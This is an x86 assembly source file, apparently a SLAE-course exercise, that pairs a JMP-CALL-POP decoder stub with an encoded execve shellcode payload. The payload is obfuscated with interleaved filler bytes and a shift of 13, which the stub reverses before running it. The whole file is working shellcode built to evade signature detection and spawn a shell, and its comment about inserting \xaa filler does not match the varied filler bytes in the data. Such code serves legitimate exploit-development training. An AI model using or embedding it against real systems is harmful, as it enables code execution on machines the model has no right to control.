; Decoder for the custom encoder created
; insertion of \xaa every other byte and rot 13 on the actual shellcode values


global _start

section .text

_start:

	jmp short call_shellcode

decoder:
	pop esi			; shellcode start address
	lea edi, [esi]		; first shellcode byte
	xor eax, eax		
	xor ebx, ebx

decode:
	mov bl, byte [esi + eax]
	cmp bl, 0xbb
	jnz cont
	cmp byte [esi + eax + 1], 0xbb
	jz ShellCode
cont:
	sub bl, 13
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode


call_shellcode:
	call decoder

	; execve-stack shellcode from SLAE course
	ShellCode: db 0x3e,0x62,0xcd,0x8b,0x5d,0xb1,0x75,0x20,0x3c,0xb7,0x3c,0x5e,0x80,0x36,0x75,0xee,0x75,0x25,0x3c,0x05,0x6f,0xa3,0x76,0x8e,0x7b,0xea,0x96,0xa3,0xf0,0x8c,0x5d,0x6d,0x96,0x42,0xef,0x2a,0x60,0xe6,0x96,0xac,0xee,0xb3,0xbd,0x95,0x18,0x71,0xda,0x73,0x8d,0x04,0xbb,0xbb
